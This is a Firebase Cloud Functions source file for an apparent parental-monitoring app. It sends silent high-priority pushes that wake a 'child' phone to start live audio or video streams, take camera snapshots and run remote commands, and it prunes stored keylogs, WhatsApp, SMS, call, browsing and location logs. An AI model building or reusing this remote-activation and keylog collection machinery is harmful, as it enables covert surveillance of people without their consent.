const functions = require("firebase-functions");
const admin = require("firebase-admin");

const DB_INSTANCE = "apnasatthilko-default-rtdb";
const DB_URL = "https://apnasatthilko-default-rtdb.asia-southeast1.firebasedatabase.app";

if (!admin.apps.length) {
  admin.initializeApp({
    databaseURL: DB_URL
  });
}

/**
 * Helper: Clean up invalid FCM token from database
 */
async function cleanupInvalidToken(uid) {
  try {
    await admin.database().ref(`/users/${uid}/fcmToken`).remove();
    console.log(`Removed invalid FCM token for user: ${uid}`);
  } catch (err) {
    console.error(`Failed to remove invalid token for ${uid}:`, err);
  }
}

/**
 * Helper: Send FCM message with invalid token handling
 */
async function sendFcmSafe(uid, token, message) {
  try {
    const response = await admin.messaging().send(message);
    return response;
  } catch (err) {
    const code = err.code || err.errorInfo?.code || "";
    if (
      code === "messaging/invalid-registration-token" ||
      code === "messaging/registration-token-not-registered" ||
      code === "messaging/invalid-argument"
    ) {
      console.warn(`Invalid FCM token for ${uid}, removing from DB.`);
      await cleanupInvalidToken(uid);
    } else {
      console.error(`FCM send error for ${uid}:`, err);
    }
    return null;
  }
}

function hasChanged(before, after, fields) {
  if (!before.exists()) return true;
  const previous = before.val() || {};
  const current = after.val() || {};
  return fields.some((field) => previous[field] !== current[field]);
}

/**
 * Realtime Database Trigger: onStreamRequested
 * Triggers on /streams/{targetUid}/status on the correct database instance
 * Sends High-Priority FCM Data Push to wake up Child phone lock-screen.
 */
exports.onStreamRequested = functions.database
  .instance(DB_INSTANCE)
  .ref("/streams/{targetUid}/status")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const statusData = change.after.val();

    if (!statusData) {
      console.log(`Stream request removed for target: ${targetUid}`);
      return null;
    }

    if (!hasChanged(change.before, change.after, ["status", "streamType", "type", "sessionId"])) {
      return null;
    }

    const status = statusData.status || "";

    // If stream was stopped by parent, notify child to STOP
    if (status === "STOPPED" || status === "DISCONNECTED") {
      try {
        const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
        const userData = userSnapshot.val();
        if (userData && userData.fcmToken) {
          const stopMsg = {
            token: userData.fcmToken,
            android: { priority: "high", ttl: "0s" },
            data: { action: "STOP_STREAM", timestamp: String(Date.now()) }
          };
          await sendFcmSafe(targetUid, userData.fcmToken, stopMsg);
          console.log(`Sent STOP_STREAM FCM push to ${targetUid}`);
        }
      } catch (err) {
        console.error(`Error sending STOP_STREAM to ${targetUid}:`, err);
      }
      return null;
    }

    // Only process when parent explicitly REQUESTED a live stream
    if (status !== "REQUESTED") {
      console.log(`Ignoring status '${status}' for target: ${targetUid}`);
      return null;
    }

    const streamType = (statusData.streamType || statusData.type || "audio").toLowerCase();
    const hasVideo = streamType === "video";
    const sessionId = statusData.sessionId || `session_${targetUid}_${Date.now()}`;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();

      if (!userData || !userData.fcmToken) {
        console.error(`No FCM Token found for user: ${targetUid}`);
        return null;
      }

      const message = {
        token: userData.fcmToken,
        android: {
          priority: "high",
          ttl: "0s"
        },
        data: {
          action: "START_STREAM",
          streamType: streamType,
          hasVideo: hasVideo ? "true" : "false",
          sessionId: sessionId,
          timestamp: String(Date.now())
        }
      };

      const response = await sendFcmSafe(targetUid, userData.fcmToken, message);
      if (response) {
        console.log(`Successfully sent high-priority FCM push (${streamType}) to ${targetUid}:`, response);
      }
      return response;
    } catch (error) {
      console.error(`Error sending FCM push to ${targetUid}:`, error);
      return null;
    }
  });

/**
 * Realtime Database Trigger: onSnapshotRequested
 * Triggers on /streams/{targetUid}/snapshotRequest
 */
exports.onSnapshotRequested = functions.database
  .instance(DB_INSTANCE)
  .ref("/streams/{targetUid}/snapshotRequest")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const data = change.after.val();
    if (!data || data.status !== "REQUESTED") return null;
    if (!hasChanged(change.before, change.after, ["status", "cameraFacing", "requestId"])) return null;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();
      if (userData && userData.fcmToken) {
        const message = {
          token: userData.fcmToken,
          android: { priority: "high", ttl: "0s" },
          data: {
            action: "WAKEUP",
            type: "SNAPSHOT",
            facing: data.cameraFacing || "back",
            timestamp: String(Date.now())
          }
        };
        await sendFcmSafe(targetUid, userData.fcmToken, message);
        console.log(`Sent SNAPSHOT FCM wake-up to ${targetUid}`);
      }
    } catch (err) {
      console.error(`Error sending snapshot FCM to ${targetUid}:`, err);
    }
    return null;
  });

/**
 * Realtime Database Trigger: onCommandSent
 * Triggers on /commands/{targetUid}/{command}
 */
exports.onCommandSent = functions.database
  .instance(DB_INSTANCE)
  .ref("/commands/{targetUid}/{command}")
  .onWrite(async (change, context) => {
    const targetUid = context.params.targetUid;
    const command = context.params.command;
    const data = change.after.val();
    // Ignore deletes and rewrites that do not change the command payload.
    if (!data) return null;
    if (!hasChanged(change.before, change.after, ["timestamp", "status", "command", "requestId"])) return null;

    try {
      const userSnapshot = await admin.database().ref(`/users/${targetUid}`).once("value");
      const userData = userSnapshot.val();
      if (userData && userData.fcmToken) {
        const message = {
          token: userData.fcmToken,
          android: { priority: "high", ttl: "0s" },
          data: {
            action: "WAKEUP",
            type: "COMMAND",
            command: command,
            timestamp: String(Date.now())
          }
        };
        await sendFcmSafe(targetUid, userData.fcmToken, message);
        console.log(`Sent COMMAND FCM wake-up (${command}) to ${targetUid}`);
      }
    } catch (err) {
      console.error(`Error sending command FCM to ${targetUid}:`, err);
    }
    return null;
  });

/**
 * Scheduled Cloud Function: Daily auto-cleanup for logs older than 30 days
 * Keeps Realtime Database fast, optimizes quotas, and prevents memory bloat.
 */
  exports.cleanupOldData = functions.pubsub
  .schedule("every 24 hours")
  .onRun(async (context) => {
    const THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
    const cutoffTime = Date.now() - THIRTY_DAYS_MS;
    const db = admin.database();

    const nodesToPrune = [
      "whatsapp_logs",
      "youtube_history",
      "notifications",
      "alerts",
      "call_logs",
      "sms_logs",
      "web_history",
      "network_history",
      "keylogs",
      "wifi_logs",
      "social_media_usage",
      "snapshots",
      "location_history"
    ];

    console.log(`Starting automated daily cleanup. Cutoff time: ${new Date(cutoffTime).toISOString()}`);

    for (const node of nodesToPrune) {
      try {
        const rootRef = db.ref(node);
        const childrenSnapshot = await rootRef.once("value");
        if (!childrenSnapshot.exists()) continue;

        const promises = [];
        childrenSnapshot.forEach((childSnap) => {
          const childUid = childSnap.key;
          const userLogsRef = db.ref(`${node}/${childUid}`);

          promises.push(
            userLogsRef
              .orderByChild("timestamp")
              .endAt(cutoffTime)
              .once("value")
              .then((snapshot) => {
                if (!snapshot.exists()) return null;
                const updates = {};
                snapshot.forEach((itemSnap) => {
                  updates[itemSnap.key] = null;
                });
                return userLogsRef.update(updates);
              })
              .catch((err) => {
                console.error(`Error pruning ${node}/${childUid}:`, err);
              })
          );
        });

        await Promise.all(promises);
        console.log(`Completed pruning for node: ${node}`);
      } catch (err) {
        console.error(`Failed to prune node ${node}:`, err);
      }
    }

    // Keep recording metadata and binary files on the same retention policy.
    // This is intentionally separate because recording metadata uses startTime,
    // while the other history nodes use timestamp.
    try {
      const recordingCutoff = Date.now() - (14 * 24 * 60 * 60 * 1000);
      const recordingRoot = db.ref("recordings");
      const recordingSnapshot = await recordingRoot.once("value");
      const recordingUpdates = {};
      recordingSnapshot.forEach((childSnap) => {
        childSnap.forEach((recordingSnap) => {
          const recording = recordingSnap.val() || {};
          if (Number(recording.startTime || 0) > 0 && Number(recording.startTime) < recordingCutoff) {
            recordingUpdates[`${childSnap.key}/${recordingSnap.key}`] = null;
          }
        });
      });
      if (Object.keys(recordingUpdates).length > 0) {
        await recordingRoot.update(recordingUpdates);
      }

      const bucket = admin.storage().bucket();
      const [files] = await bucket.getFiles({ prefix: "recordings/" });
      await Promise.all(files
        .filter((file) => Number(new Date(file.metadata.timeCreated || 0)) < recordingCutoff)
        .map((file) => file.delete().catch((err) => console.error("Failed to delete recording file:", err))));
    } catch (err) {
      console.error("Failed to clean up recordings:", err);
    }

    // Clean up stale WebRTC signaling sessions older than 2 hours
    try {
      const TWO_HOURS_MS = 2 * 60 * 60 * 1000;
      const signalingCutoff = Date.now() - TWO_HOURS_MS;
      const signalingRef = db.ref("signaling");
      const sigSnap = await signalingRef.once("value");
      if (sigSnap.exists()) {
        const sigUpdates = {};
        sigSnap.forEach((item) => {
          const val = item.val();
          if (val && val.timestamp && val.timestamp < signalingCutoff) {
            sigUpdates[item.key] = null;
          }
        });
        if (Object.keys(sigUpdates).length > 0) {
          await signalingRef.update(sigUpdates);
          console.log(`Cleaned up ${Object.keys(sigUpdates).length} stale signaling sessions.`);
        }
      }
    } catch (err) {
      console.error("Failed to clean up stale signaling sessions:", err);
    }

    return null;
  });
